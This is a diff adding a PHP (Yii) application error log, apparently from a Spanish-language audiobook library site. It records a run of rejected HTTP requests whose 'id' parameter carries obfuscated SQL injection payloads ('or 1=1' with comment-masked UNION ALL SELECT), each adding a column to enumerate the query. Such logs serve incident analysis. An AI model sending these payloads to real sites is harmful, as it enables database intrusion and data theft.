@@ -1,0 +1,446 @@
+2023/08/01 12:17:03 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39
+---
+2023/08/01 12:17:31 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39
+---
+2023/08/01 12:17:34 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39
+---
+2023/08/01 12:17:40 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39
+---
+2023/08/01 12:17:50 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39
+---
+2023/08/01 12:17:54 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39
+---
+2023/08/01 12:17:58 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39
+---
+2023/08/01 12:18:02 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39
+---
+2023/08/01 12:18:12 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
+#0 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(309): CController->invalidActionParams(Object(CInlineAction))
+#1 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(133): CController->runAction(Object(CInlineAction))
+#2 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilter.php(40): CFilterChain->run()
+#3 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(1145): CFilter->filter(Object(CFilterChain))
+#4 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CInlineFilter.php(58): CController->filterAccessControl(Object(CFilterChain))
+#5 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/filters/CFilterChain.php(130): CInlineFilter->filter(Object(CFilterChain))
+#6 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(291): CFilterChain->run()
+#7 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#8 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(282): CController->run('view')
+#9 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CWebApplication.php(141): CWebApplication->runController('libros/view')
+#10 /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#11 /home/comparlante/public_html/biblioteca_audiolibros/comparlante/index.php(13): CApplication->run()
+#12 {main}
+REQUEST_URI=/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39
+HTTP_REFERER=https://audioteca.comparlante.com/comparlante/index.php?r=libros/view&id=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+0x393631353738343330312e39%2c0x393631353738343330322e39%2c0x393631353738343330332e39%2c0x393631353738343330342e39%2c0x393631353738343330352e39%2c0x393631353738343330362e39%2c0x393631353738343330372e39%2c0x393631353738343330382e39%2c0x393631353738343330392e39%2c0x39363135373834333031302e39%2c0x39363135373834333031312e39%2c0x39363135373834333031322e39%2c0x39363135373834333031332e39%2c0x39363135373834333031342e39%2c0x39363135373834333031352e39%2c0x39363135373834333031362e39%2c0x39363135373834333031372e39%2c0x39363135373834333031382e39%2c0x39363135373834333031392e39%2c0x39363135373834333032302e39%2c0x39363135373834333032312e39%2c0x39363135373834333032322e39%2c0x39363135373834333032332e39%2c0x39363135373834333032342e39%2c0x39363135373834333032352e39
+---
+2023/08/01 12:18:25 [error] [exception.CHttpException.400] exception 'CHttpException' with message 'Your request is invalid.' in /home/comparlante/public_html/biblioteca_audiolibros/yii/framework/web/CController.php:336
+Stack trace:
